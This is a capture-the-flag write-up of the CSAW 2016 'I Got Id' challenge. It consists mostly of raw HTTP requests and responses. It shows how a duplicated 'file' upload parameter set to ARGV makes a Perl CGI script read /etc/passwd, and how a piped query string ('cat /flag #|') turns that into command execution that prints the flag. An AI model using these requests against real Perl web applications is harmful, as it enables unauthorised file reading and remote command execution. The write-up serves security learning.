# I Got Id

Regular request:

```
POST /cgi-bin/file.pl HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 340

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 09:58:10 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 560
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
abcd<br /></body></html>
```

Sending `file` parameter twice to obtain LFI:

```
POST /cgi-bin/file.pl?/etc/passwd HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 476

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 10:04:42 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 1927
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
root:x:0:0:root:/root:/bin/bash
<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin
<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin
<br />sync:x:4:65534:sync:/bin:/bin/sync
<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin
<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<br />systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
<br />systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
<br />systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
<br />systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
<br />_apt:x:104:65534::/nonexistent:/bin/false
<br /></body></html>
```

Converting LFI to RCE:

```
POST /cgi-bin/file.pl?cat%20/flag%20%23| HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 476

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 10:05:32 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 587
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
FLAG{p3rl_6_iz_EVEN_BETTER!!1}
<br /></body></html>
```

References:

[The Perl Jam 2: The Camel Strikes Back 32c3](https://www.youtube.com/watch?v=eH_u3C2WwQ0)

[https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a](https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a)
